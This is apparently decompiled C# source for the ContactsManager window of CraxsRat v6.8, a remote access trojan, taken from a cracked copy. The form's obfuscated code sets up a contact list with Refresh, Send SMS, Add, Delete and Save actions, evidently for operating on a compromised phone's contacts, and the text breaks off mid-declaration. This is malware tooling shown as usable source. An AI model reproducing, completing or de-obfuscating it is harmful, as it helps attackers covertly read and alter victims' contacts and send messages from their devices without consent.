// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.ContactsManager
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using Craxs_Rat.sockets;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class ContactsManager : Form
  {
    public Craxs_Rat.sockets.Client classCamera;
    public TcpClient Client;
    public Craxs_Rat.sockets.Client classClient;
    public string Title;
    private bool MouseState;
    public int FPS;
    public int FPSTMP;
    public string SizeFrame;
    public PictureBox TempImage;
    public string KEYsx;

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      ((CraxsSettings) this).components = (IContainer) new System.ComponentModel.Container();
label_1:
      int num1 = 187535340;
      DataGridViewCellStyle gridViewCellStyle1;
      DataGridViewCellStyle gridViewCellStyle2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~(~((~num1 ^ -2029190533 * (--412769803 - (95595043 ^ 1173891001)) ^ -131015033 * (1181778243 ^ 1902931872) + (1339379780 ^ --631104296)) + -~-964049267 * -1350489385) ^ ~1682562276)) % 90U)
        {
          case 0:
            this.Controls.Add((Control) this.PB);
            this.Controls.Add((Control) this.BoxTitle);
            num1 = (int) num2 * 34084698 ^ 534273880;
            continue;
          case 1:
            this.SuspendLayout();
            num1 = (int) num2 * 200801988 ^ 1340952950;
            continue;
          case 2:
            this.ctxMenu.Name = EXGuarder.\u00303503166;
            this.ctxMenu.ShowImageMargin = false;
            num1 = (int) num2 * -1477348738 ^ 1166265710;
            continue;
          case 3:
            this.RefreshToolStripMenuItem.Text = EXGuarder.\u003353D6171;
            this.SendSmsToolStripMenuItem.Name = EXGuarder.\u00325711250;
            num1 = (int) num2 * -823184124 ^ -134806395;
            continue;
          case 4:
            this.PB.Location = new Point(0, 263);
            this.PB.Margin = new Padding(4);
            num1 = (int) num2 * -2078878781 ^ -812456016;
            continue;
          case 5:
            this.DGV0.BorderStyle = BorderStyle.None;
            num1 = (int) num2 * 1789965081 ^ 2130511162;
            continue;
          case 6:
            this.DGV0.AllowUserToAddRows = false;
            this.DGV0.AllowUserToDeleteRows = false;
            num1 = (int) num2 * 1803395625 ^ -1317806383;
            continue;
          case 7:
            this.ctxMenu.SuspendLayout();
            ((ISupportInitialize) this.BoxTitle).BeginInit();
            num1 = (int) num2 * -2073321569 ^ -452333288;
            continue;
          case 8:
            this.SaveAsToolStripMenuItem.Visible = false;
            this.TOpacity.Interval = 1;
            num1 = (int) num2 * -847324235 ^ 1761518335;
            continue;
          case 9:
            this.SaveAsToolStripMenuItem.Size = new Size(115, 24);
            this.SaveAsToolStripMenuItem.Text = EXGuarder.\u00306310703;
            num1 = (int) num2 * -303795903 ^ 1344502715;
            continue;
          case 10:
            this.Margin = new Padding(4);
            num1 = (int) num2 * 1582986388 ^ 168949825;
            continue;
          case 11:
            this.Name = EXGuarder.\u003132D6319;
            this.Opacity = 0.0;
            num1 = (int) num2 * 1197971189 ^ -1124747736;
            continue;
          case 12:
            this.PB.Name = EXGuarder.\u0035A390321;
            this.PB.Size = new Size(552, 12);
            this.PB.TabIndex = 6;
            this.BoxTitle.BackColor = Color.Black;
            num1 = (int) num2 * 379606333 ^ 912664683;
            continue;
          case 13:
            this.RefreshToolStripMenuItem.Name = EXGuarder.\u003141D371B;
            num1 = (int) num2 * 427577582 ^ 454342184;
            continue;
          case 14:
            this.DGV0.ColumnHeadersBorderStyle = DataGridViewHeaderBorderStyle.None;
            num1 = (int) num2 * -1390658458 ^ -631329260;
            continue;
          case 15:
            this.BoxTitle.Margin = new Padding(4);
            num1 = (int) num2 * -1604951763 ^ -1190458262;
            continue;
          case 16:
            gridViewCellStyle2.Alignment = DataGridViewContentAlignment.MiddleLeft;
            num1 = (int) num2 * 1401805029 ^ -1388723379;
            continue;
          case 17:
            this.ctxMenu.ImageScalingSize = new Size(20, 20);
            this.ctxMenu.Items.AddRange(new ToolStripItem[6]
            {
              (ToolStripItem) this.RefreshToolStripMenuItem,
              (ToolStripItem) this.SendSmsToolStripMenuItem,
              (ToolStripItem) this.AddToolStripMenuItem,
              (ToolStripItem) this.DeleteToolStripMenuItem,
              (ToolStripItem) this.SaveToolStripMenuItem,
              (ToolStripItem) this.SaveAsToolStripMenuItem
            });
            num1 = (int) num2 * 145145012 ^ 649735484;
            continue;
          case 18:
            this.SaveAsToolStripMenuItem.Name = EXGuarder.\u003775E735B;
            num1 = (int) num2 * 2026767025 ^ -509213639;
            continue;
          case 19:
            this.Column1 = new DataGridViewTextBoxColumn();
            this.Column6 = new DataGridViewTextBoxColumn();
            num1 = (int) num2 * 1305742915 ^ 657307720;
            continue;
          case 20:
            gridViewCellStyle1.SelectionBackColor = Color.FromArgb(190, 190, 190);
            gridViewCellStyle1.SelectionForeColor = Color.Black;
            num1 = (int) num2 * -80971976 ^ 1300746316;
            continue;
          case 21:
            this.DGV0.EditMode = DataGridViewEditMode.EditProgrammatically;
            num1 = (int) num2 * -1626449539 ^ -2061656861;
            continue;
          case 22:
            this.AutoScaleMode = AutoScaleMode.Font;
            this.ClientSize = new Size(552, 297);
            num1 = (int) num2 * -1941853857 ^ -934815552;
            continue;
          case 23:
            gridViewCellStyle2.SelectionBackColor = SystemColors.Highlight;
            gridViewCellStyle2.SelectionForeColor = SystemColors.HighlightText;
            num1 = (int) num2 * 759787178 ^ -1221881140;
            continue;
          case 24:
            this.DGV0.Name = EXGuarder.\u003002B2C39;
            num1 = (int) num2 * -812352801 ^ 1129456314;
            continue;
          case 25:
            this.DGV0.AllowUserToResizeColumns = false;
            this.DGV0.AllowUserToResizeRows = false;
            this.DGV0.AutoSizeColumnsMode = DataGridViewAutoSizeColumnsMode.AllCells;
            this.DGV0.AutoSizeRowsMode = DataGridViewAutoSizeRowsMode.AllCells;
            num1 = (int) num2 * -816659919 ^ 164603263;
            continue;
          case 26:
            this.AddToolStripMenuItem.Size = new Size(115, 24);
            this.AddToolStripMenuItem.Text = EXGuarder.\u0034B1E212D;
            this.DeleteToolStripMenuItem.Name = EXGuarder.\u0032E70584C;
            num1 = (int) num2 * -1468640822 ^ -368247920;
            continue;
          case 27:
            this.Column2.Name = EXGuarder.\u00329766A75;
            num1 = (int) num2 * 1980047183 ^ 2087069073;
            continue;
          case 28:
            this.Column6.HeaderText = EXGuarder.\u0036844736F;
            num1 = (int) num2 * 289025303 ^ -1523918797;
            continue;
          case 29:
            this.SaveToolStripMenuItem = new ToolStripMenuItem();
            num1 = (int) num2 * -1989592936 ^ 410850341;
            continue;
          case 30:
            gridViewCellStyle1.WrapMode = DataGridViewTriState.False;
            num1 = (int) num2 * 1653423373 ^ 955844125;
            continue;
          case 31:
            this.TOpacity = new System.Windows.Forms.Timer(((CraxsSettings) this).components);
            num1 = (int) num2 * 870038971 ^ -2021785648;
            continue;
          case 32:
            this.SendSmsToolStripMenuItem = new ToolStripMenuItem();
            this.AddToolStripMenuItem = new ToolStripMenuItem();
            num1 = (int) num2 * 2144140582 ^ 25419289;
            continue;
          case 33:
            this.BoxTitle.Dock = DockStyle.Bottom;
            num1 = (int) num2 * 1475503591 ^ -162992467;
            continue;
          case 34:
            this.BoxTitle.ErrorImage = (Image) null;
            this.BoxTitle.InitialImage = (Image) null;
            this.BoxTitle.Location = new Point(0, 275);
            num1 = (int) num2 * -503211413 ^ -2134149725;
            continue;
          case 35:
            this.DGV0.ContextMenuStrip = this.ctxMenu;
            num1 = (int) num2 * -272959682 ^ 996112519;
            continue;
          case 36:
            goto label_1;
          case 37:
            gridViewCellStyle1.Font = new Font(EXGuarder.\u003292F0179, 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            gridViewCellStyle1.ForeColor = Color.FromArgb(190, 190, 190);
            num1 = (int) num2 * -867058981 ^ 1990696633;
            continue;
          case 38:
            this.DGV0.TabIndex = 3;
            num1 = (int) num2 * 2004590120 ^ 371998395;
            continue;
          case 39:
            this.SendSmsToolStripMenuItem.Text = EXGuarder.\u00303354B22;
            this.AddToolStripMenuItem.Name = EXGuarder.\u0032F5C5E0C;
            num1 = (int) num2 * 1635880161 ^ 1477099111;
            continue;
          case 40:
            this.DGV0 = new DataGridView();
            num1 = (int) num2 * 1918129976 ^ 1726642817;
            continue;
          case 41:
            gridViewCellStyle1.Alignment = DataGridViewContentAlignment.MiddleLeft;
            gridViewCellStyle1.BackColor = Color.Black;
            num1 = (int) num2 * -449114166 ^ 305863749;
            continue;
          case 42:
            this.DGV0.Columns.AddRange((DataGridViewColumn) this.Column1, (DataGridViewColumn) this.Column6, (DataGridViewColumn) this.Column9, (DataGridViewColumn) this.Column2);
            num1 = (int) num2 * 1876250204 ^ -483577999;
            continue;
          case 43:
            this.ShowIcon = false;
            this.Text = EXGuarder.\u003132D6319;
            num1 = (int) num2 * 346293920 ^ 997396666;
            continue;
          case 44:
            gridViewCellStyle2.ForeColor = Color.FromArgb(190, 190, 190);
            num1 = (int) num2 * -738441376 ^ 1687485101;
            continue;
          case 45:
            this.DGV0.Size = new Size(552, 263);
            num1 = (int) num2 * 1104558850 ^ -1196224974;
            continue;
          case 46:
            this.SaveToolStripMenuItem.Visible = false;
            num1 = (int) num2 * 1691207167 ^ 417274418;
            continue;
          case 47:
            this.BoxTitle.Name = EXGuarder.\u0033F5A6845;
            num1 = (int) num2 * 36220521 ^ -2106579001;
            continue;
          case 49:
            this.DGV0.Location = new Point(0, 0);
            this.DGV0.Margin = new Padding(4);
            num1 = (int) num2 * 1842093954 ^ -142314376;
            continue;
          case 50:
            gridViewCellStyle2 = new DataGridViewCellStyle();
            num1 = (int) num2 * -1496344555 ^ 313420376;
            continue;
          case 51:
            this.PB.Dock = DockStyle.Bottom;
            num1 = (int) num2 * -1738359335 ^ -817083811;
            continue;
          case 52:
            this.DGV0.EnableHeadersVisualStyles = false;
            this.DGV0.GridColor = Color.FromArgb(42, 42, 42);
            num1 = (int) num2 * 1995165012 ^ 311201173;
            continue;
          case 53:
            this.Column6.Name = EXGuarder.\u0031F4F782B;
            num1 = (int) num2 * -1704144982 ^ -1717535039;
            continue;
          case 54:
            this.RefreshToolStripMenuItem.Size = new Size(115, 24);
            num1 = (int) num2 * 108196600 ^ 1795911423;
            continue;
          case 55:
            ((ISupportInitialize) this.DGV0).BeginInit();
            num1 = (int) num2 * 896204743 ^ 1630148658;
            continue;
          case 56:
            this.BoxTitle.TabStop = false;
            this.AutoScaleDimensions = new SizeF(8f, 16f);
            num1 = (int) num2 * 369598050 ^ 1708731052;
            continue;
          case 57:
            this.DGV0.CellBorderStyle = DataGridViewCellBorderStyle.None;
            num1 = (int) num2 * 284689193 ^ 504463825;
            continue;
          case 58:
            this.RefreshToolStripMenuItem = new ToolStripMenuItem();
            num1 = (int) num2 * -550107235 ^ 5080358;
            continue;
          case 59:
            this.Column9 = new DataGridViewTextBoxColumn();
            num1 = (int) num2 * 1472532933 ^ 1372052413;
            continue;
          case 60:
            this.DGV0.BackgroundColor = Color.Black;
            num1 = (int) num2 * -1893499128 ^ -930318425;
            continue;
          case 61:
            this.SaveToolStripMenuItem.Size = new Size(115, 24);
            this.SaveToolStripMenuItem.Text = EXGuarder.\u00376337060;
            num1 = (int) num2 * -439853060 ^ 1081200012;
            continue;
          case 62:
            this.ctxMenu = new ContextMenuStrip(((CraxsSettings) this).components);
            num1 = (int) num2 * 588909393 ^ -762876564;
            continue;
          case 63:
            gridViewCellStyle2.BackColor = Color.Black;
            num1 = (int) num2 * -1983757782 ^ -218360034;
            continue;
          case 64:
            this.Controls.Add((Control) this.DGV0);
            num1 = (int) num2 * 1654201347 ^ 1918736192;
            continue;
          case 65:
            this.DeleteToolStripMenuItem = new ToolStripMenuItem();
            num1 = (int) num2 * -1378045013 ^ -1466595856;
            continue;
          case 66:
            this.Column2 = new DataGridViewImageColumn();
            num1 = (int) num2 * 1966613603 ^ 2057131812;
            continue;
          case 67:
            this.Column6.Width = 82;
            this.Column9.HeaderText = EXGuarder.\u00347796C4F;
            num1 = (int) num2 * 174525998 ^ 679386183;
            continue;
          case 68:
            this.DGV0.RowHeadersBorderStyle = DataGridViewHeaderBorderStyle.Single;
            this.DGV0.RowHeadersVisible = false;
            num1 = (int) num2 * -1391372012 ^ 1868907937;
            continue;
          case 69:
            this.BoxTitle.TabIndex = 7;
            num1 = (int) num2 * -1570442068 ^ -1361902770;
            continue;
          case 70:
            this.Column2.Width = 2;
            num1 = (int) num2 * -545797433 ^ -122473329;
            continue;
          case 71:
            this.Column2.MinimumWidth = 2;
            num1 = (int) num2 * -1100077553 ^ 244092216;
            continue;
          case 72:
            ((ISupportInitialize) this.DGV0).EndInit();
            this.ctxMenu.ResumeLayout(false);
            ((ISupportInitialize) this.BoxTitle).EndInit();
            num1 = (int) num2 * 135978248 ^ -1139640600;
            continue;
          case 73:
            this.Column2.AutoSizeMode = DataGridViewAutoSizeColumnMode.None;
            this.Column2.FillWeight = 1f;
            this.Column2.HeaderText = EXGuarder.\u00318753B3E;
            num1 = (int) num2 * -339226063 ^ 984022444;
            continue;
          case 74:
            this.DeleteToolStripMenuItem.Text = EXGuarder.\u0034E1F6673;
            this.SaveToolStripMenuItem.Name = EXGuarder.\u00340440D1F;
            num1 = (int) num2 * -1478855916 ^ 353835071;
            continue;
          case 75:
            this.Column1.HeaderText = EXGuarder.\u003183D582D;
            this.Column1.Name = EXGuarder.\u00361471E09;
            this.Column1.Width = 68;
            num1 = (int) num2 * 656513849 ^ 1650217479;
            continue;
          case 76:
            gridViewCellStyle2.Font = new Font(EXGuarder.\u003292F0179, 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * 248376345 ^ 1654939982;
            continue;
          case 77:
            this.DGV0.Dock = DockStyle.Fill;
            num1 = (int) num2 * -571917044 ^ -1796286743;
            continue;
          case 78:
            this.Column2.SortMode = DataGridViewColumnSortMode.Programmatic;
            num1 = (int) num2 * 1003635451 ^ 1074115542;
            continue;
          case 79:
            this.Column9.Name = EXGuarder.\u00372787200;
            this.Column9.Width = 119;
            num1 = (int) num2 * -525920156 ^ -417027315;
            continue;
          case 80:
            this.BoxTitle.Size = new Size(552, 22);
            num1 = (int) num2 * 1205508174 ^ 1771037551;
            continue;
          case 81:
            this.PB = new ProgressBar();
            this.BoxTitle = new PictureBox();
            num1 = (int) num2 * -476778308 ^ 671075289;
            continue;
          case 82:
            this.ctxMenu.Size = new Size(116, 148);
            num1 = (int) num2 * 871956676 ^ 203318667;
            continue;
          case 83:
            this.SendSmsToolStripMenuItem.Size = new Size(115, 24);
            num1 = (int) num2 * -1988454688 ^ 8231801;
            continue;
          case 84:
            this.DeleteToolStripMenuItem.Size = new Size(115, 24);
            num1 = (int) num2 * 564517169 ^ 1022551806;
            continue;
          case 85:
            this.DGV0.DefaultCellStyle = gridViewCellStyle1;
            num1 = (int) num2 * -1725392493 ^ 774443538;
            continue;
          case 86:
            gridViewCellStyle2.WrapMode = DataGridViewTriState.True;
            this.DGV0.ColumnHeadersDefaultCellStyle = gridViewCellStyle2;
            this.DGV0.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
            num1 = (int) num2 * -644922221 ^ -57601776;
            continue;
          case 87:
            this.SaveAsToolStripMenuItem = new ToolStripMenuItem();
            num1 = (int) num2 * 392827949 ^ 207550246;
            continue;
          case 88:
            gridViewCellStyle1 = new DataGridViewCellStyle();
            num1 = (int) num2 * -154042844 ^ 1288490314;
            continue;
          case 89:
            this.DGV0.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
            num1 = (int) num2 * 97327445 ^ -629610212;
            continue;
          default:
            goto label_91;
        }
      }
label_91:
      this.ResumeLayout(false);
    }

    internal virtual DataGridView DGV0
    {
      get => ((CraxsSettings) this)._DGV0;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DataGridViewRowsRemovedEventHandler removedEventHandler = new DataGridViewRowsRemovedEventHandler(this.DGV0_RowsRemoved);
        DataGridViewRowsAddedEventHandler addedEventHandler = new DataGridViewRowsAddedEventHandler(this.DGV0_RowsAdded);
label_1:
        int num1 = 1243931592;
        EventHandler eventHandler;
        DataGridView dgV0;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-(~~num1 + ~(497429321 - 81207170 - ~1160953774) + 2118141292 * 12238593) - 817373438)) % 10U)
          {
            case 0:
              dgV0.RowsRemoved -= removedEventHandler;
              dgV0.RowsAdded -= addedEventHandler;
              num1 = (int) num2 * 1742268469 ^ -1630926018;
              continue;
            case 1:
              eventHandler = new EventHandler(this.DGV0_SelectionChanged);
              num1 = (int) num2 * 434662425 ^ 1117240586;
              continue;
            case 2:
              int num3 = dgV0 == null ? -1409134988 : (num3 = 1923818587);
              num1 = num3 ^ (int) num2 * -514830556;
              continue;
            case 3:
              goto label_1;
            case 4:
              dgV0 = ((CraxsSettings) this)._DGV0;
              int num4 = dgV0 == null ? 637508086 : (num4 = -1612663841);
              num1 = num4 ^ (int) num2 * -1520101643;
              continue;
            case 5:
              dgV0.SelectionChanged -= eventHandler;
              num1 = (int) num2 * -1320859621 ^ -203044799;
              continue;
            case 6:
              dgV0 = ((CraxsSettings) this)._DGV0;
              num1 = (int) num2 * 849919899 ^ -52127447;
              continue;
            case 7:
              ((CraxsSettings) this)._DGV0 = value;
              num1 = 884004537;
              continue;
            case 8:
              dgV0.RowsRemoved += removedEventHandler;
              dgV0.RowsAdded += addedEventHandler;
              dgV0.SelectionChanged += eventHandler;
              num1 = (int) num2 * 473767184 ^ -1815699916;
              continue;
            case 9:
              goto label_3;
            default:
              goto label_12;
          }
        }
label_3:
        return;
label_12:;
      }
    }

    internal virtual ContextMenuStrip ctxMenu
    {
      get => ((CraxsSettings) this)._ctxMenu;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((CraxsSettings) this)._ctxMenu = value;
    }

    internal virtual ToolStripMenuItem RefreshToolStripMenuItem
    {
      get => ((CraxsSettings) this)._RefreshToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.RefreshToolStripMenuItem_Click);
label_1:
        int num1 = -974122991;
        while (true)
        {
          int num2 = num1;
          uint num3;
          ToolStripMenuItem toolStripMenuItem;
          switch ((num3 = (uint) ~(-(--~1741057900 + (-1043809222 - -684499274 - (1952002301 - 1279746105) - 765203070) - num2 * -1920414073) ^ 640759302 - -2038540918 + -437076201 ^ --1409914832)) % 6U)
          {
            case 0:
              ((CraxsSettings) this)._RefreshToolStripMenuItem = value;
              toolStripMenuItem = ((CraxsSettings) this)._RefreshToolStripMenuItem;
              int num4;
              num1 = num4 = toolStripMenuItem == null ? 368230276 : (num4 = -1094172823);
              continue;
            case 1:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num3 * -1398686290 ^ 178542981;
              continue;
            case 2:
              toolStripMenuItem = ((CraxsSettings) this)._RefreshToolStripMenuItem;
              int num5 = toolStripMenuItem == null ? -1602045029 : (num5 = -1964563562);
              num1 = num5 ^ (int) num3 * 161337424;
              continue;
            case 3:
              goto label_3;
            case 4:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num3 * 620321999 ^ 958791726;
              continue;
            case 5:
              goto label_1;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
    }

    internal virtual ToolStripMenuItem AddToolStripMenuItem
    {
      get => ((CraxsSettings) this)._AddToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.AddToolStripMenuItem_Click);
label_1:
        int num1 = -1477191205;
        ToolStripMenuItem toolStripMenuItem;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~(-((num1 + (347591567 * -774051794 ^ --223223613 ^ 1437791033 * ~-1651164172 ^ ~(-1249520443 * (-1234466243 - 140060600 + (1938244924 - 1381852654))))) * 122495165) + (1989378705 - 2128277875 - -795344425) - (-1062798390 - -1620500631))) % 7U)
          {
            case 0:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num2 * 966711922 ^ 714967842;
              continue;
            case 1:
              int num3 = toolStripMenuItem == null ? -1978600788 : (num3 = -1817891126);
              num1 = num3 ^ (int) num2 * -1916393464;
              continue;
            case 2:
              goto label_1;
            case 3:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num2 * 1372946879 ^ -1081035256;
              continue;
            case 4:
              goto label_3;
            case 5:
              ((CraxsSettings) this)._AddToolStripMenuItem = value;
              toolStripMenuItem = ((CraxsSettings) this)._AddToolStripMenuItem;
              num1 = 566236997;
              continue;
            case 6:
              toolStripMenuItem = ((CraxsSettings) this)._AddToolStripMenuItem;
              int num4 = toolStripMenuItem == null ? -1417300102 : (num4 = -248693507);
              num1 = num4 ^ (int) num2 * -398557080;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual ToolStripMenuItem DeleteToolStripMenuItem
    {
      get => ((CraxsSettings) this)._DeleteToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DeleteToolStripMenuItem_Click);
        ToolStripMenuItem toolStripMenuItem = ((CraxsSettings) this)._DeleteToolStripMenuItem;
        if (toolStripMenuItem == null)
          goto label_6;
label_1:
        int num1 = -484280700;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~((num1 - (-~(-181325770 - (-36395267 ^ 230532547)) + (~(--499190687 + --1487863616) + (-1564262728 ^ 935542562) * -691818639 * 668336195)) ^ -(2082774931 - -560671786) + -(-1875995269 - -490248874) - 562341538) - ~-(-1240344123 * -941796411)) - ~1628297261 ^ 311153553)) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              int num3 = toolStripMenuItem == null ? -2132278104 : (num3 = 1166688735);
              num1 = num3 ^ (int) num2 * 881453061;
              continue;
            case 2:
              toolStripMenuItem = ((CraxsSettings) this)._DeleteToolStripMenuItem;
              num1 = (int) num2 * -2007317551 ^ -1004196342;
              continue;
            case 3:
              goto label_6;
            case 4:
              goto label_3;
            case 5:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num2 * 1926827503 ^ -1577657968;
              continue;
            case 6:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num2 * -1168944338 ^ -1926517512;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:
        return;
label_6:
        ((CraxsSettings) this)._DeleteToolStripMenuItem = value;
        num1 = -958171148;
        goto label_2;
      }
    }

    internal virtual ToolStripMenuItem SaveToolStripMenuItem
    {
      get => ((CraxsSettings) this)._SaveToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.SaveToolStripMenuItem_Click);
        ToolStripMenuItem toolStripMenuItem = ((CraxsSettings) this)._SaveToolStripMenuItem;
        if (toolStripMenuItem == null)
          goto label_5;
label_1:
        int num1 = 2141179914;
label_2:
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) ((-2014653176 + (-318367453 - 457621016 ^ -1630463072 * 239963411) - (num2 - -(-1391137152 - -417150504 - ~~-1433831043 + (-~-509166068 - ~(-705603225 ^ -1434288951))) - ~(-1112289458 - 1682740853)) ^ --1026367767 - 1939724823 * 1304063977) + --1013744549)) % 7U)
          {
            case 0:
              goto label_3;
            case 1:
              goto label_5;
            case 2:
              toolStripMenuItem = ((CraxsSettings) this)._SaveToolStripMenuItem;
              num1 = (int) num3 * 1961953732 ^ 39409749;
              continue;
            case 3:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num3 * -1089793432 ^ -575995175;
              continue;
            case 4:
              int num4 = toolStripMenuItem == null ? -696030553 : (num4 = -879617683);
              num1 = num4 ^ (int) num3 * -357341196;
              continue;
            case 5:
              goto label_1;
            case 6:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num3 * 1062871389 ^ 388941549;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:
        return;
label_5:
        ((CraxsSettings) this)._SaveToolStripMenuItem = value;
        num1 = 2066417068;
        goto label_2;
      }
    }

    internal virtual ToolStripMenuItem SaveAsToolStripMenuItem
    {
      get => ((CraxsSettings) this)._SaveAsToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.SaveAsToolStripMenuItem_Click);
label_1:
        int num1 = 64536418;
        while (true)
        {
          int num2 = num1;
          uint num3;
          ToolStripMenuItem toolStripMenuItem;
          switch ((num3 = (uint) (-1695070185 - -(~-(849197839 - -1479461599) - (num2 + (~-1370155726 ^ 217570315 - 947933798 - -1947375314 ^ 493011359 * (1678934454 - 1751243981 - 1735759534) ^ -(1852760350 - 747922104 - -1497175357 * 2092063365 - (461305841 ^ 655397919 * 718958091)))) * 698750631 ^ 1334299721))) % 9U)
          {
            case 0:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num3 * -1485437693 ^ -117399944;
              continue;
            case 1:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num3 * 1670139289 ^ 795448027;
              continue;
            case 2:
              int num4 = toolStripMenuItem == null ? 1601843763 : (num4 = 1633296636);
              num1 = num4 ^ (int) num3 * -466356484;
              continue;
            case 3:
              int num5 = toolStripMenuItem == null ? -1742681847 : (num5 = 1829322699);
              num1 = num5 ^ (int) num3 * -1717835864;
              continue;
            case 4:
              goto label_3;
            case 5:
              goto label_1;
            case 6:
              ((CraxsSettings) this)._SaveAsToolStripMenuItem = value;
              num1 = 1873291684;
              continue;
            case 7:
              toolStripMenuItem = ((CraxsSettings) this)._SaveAsToolStripMenuItem;
              num1 = (int) num3 * 745367022 ^ 1443319682;
              continue;
            case 8:
              toolStripMenuItem = ((CraxsSettings) this)._SaveAsToolStripMenuItem;
              num1 = (int) num3 * 810365640 ^ 1009127462;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual System.Windows.Forms.Timer TOpacity
    {
      get => ((CraxsSettings) this)._TOpacity;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.TOpacity_Tick);
label_1:
        int num1 = -249456247;
        System.Windows.Forms.Timer topacity;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((num1 ^ 283259261 * --138327717 - 1021122295 * 715040405 - (-85815893 * -1053729985 + (316896075 * 580818538 + (-1877234887 ^ 1985644956))) + --1748821580 * 1761869487 ^ ~~~-186470153 + (~(303284911 - 1650708433) - (-1301684776 - 1687983091 ^ 246936883 * 1288714742))) - (~(-1305334208 - 2059244848) + (253492155 - 2076570444 ^ -424805360 ^ -1652195417)))) % 7U)
          {
            case 0:
              topacity.Tick -= eventHandler;
              num1 = (int) num2 * 348069461 ^ -2010862072;
              continue;
            case 1:
              topacity = ((CraxsSettings) this)._TOpacity;
              num1 = (int) num2 * 1898430290 ^ 573161677;
              continue;
            case 2:
              goto label_3;
            case 3:
              ((CraxsSettings) this)._TOpacity = value;
              topacity = ((CraxsSettings) this)._TOpacity;
              int num3;
              num1 = num3 = topacity == null ? 896212350 : (num3 = -368530179);
              continue;
            case 4:
              int num4 = topacity == null ? 104025092 : (num4 = 304985591);
              num1 = num4 ^ (int) num2 * 471642387;
              continue;
            case 5:
              topacity.Tick += eventHandler;
              num1 = (int) num2 * -1537457927 ^ 312232432;
              continue;
            case 6:
              goto label_1;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual ProgressBar PB
    {
      get => ((CraxsSettings) this)._PB;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((CraxsSettings) this)._PB = value;
    }

    internal virtual PictureBox BoxTitle
    {
      get => ((CraxsSettings) this)._BoxTitle;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        PaintEventHandler paintEventHandler = new PaintEventHandler(this.BoxTitle_Paint);
label_1:
        int num1 = -602375225;
        EventHandler eventHandler;
        PictureBox boxTitle;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-((num1 * -927468389 - ~--1012450895 * 2035282613) * 1686557155) - ~893191166 - 1947224572)) % 9U)
          {
            case 0:
              goto label_1;
            case 1:
              boxTitle.Paint -= paintEventHandler;
              num1 = (int) num2 * 203880153 ^ 1280466380;
              continue;
            case 2:
              ((CraxsSettings) this)._BoxTitle = value;
              boxTitle = ((CraxsSettings) this)._BoxTitle;
              num1 = -943704291;
              continue;
            case 3:
              boxTitle.Paint += paintEventHandler;
              num1 = (int) num2 * -1286996696 ^ -1859008606;
              continue;
            case 4:
              int num3 = boxTitle == null ? -998014326 : (num3 = 1689882397);
              num1 = num3 ^ (int) num2 * 1283157332;
              continue;
            case 5:
              goto label_3;
            case 6:
              boxTitle.Resize += eventHandler;
              num1 = (int) num2 * 475542407 ^ 77798741;
              continue;
            case 7:
              eventHandler = new EventHandler(this.BoxTitle_Resize);
              boxTitle = ((CraxsSettings) this)._BoxTitle;
              int num4 = boxTitle == null ? -1221561064 : (num4 = 202718315);
              num1 = num4 ^ (int) num2 * -997363478;
              continue;
            case 8:
              boxTitle.Resize -= eventHandler;
              num1 = (int) num2 * 1285108645 ^ 2052441075;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual DataGridViewTextBoxColumn Column1
    {
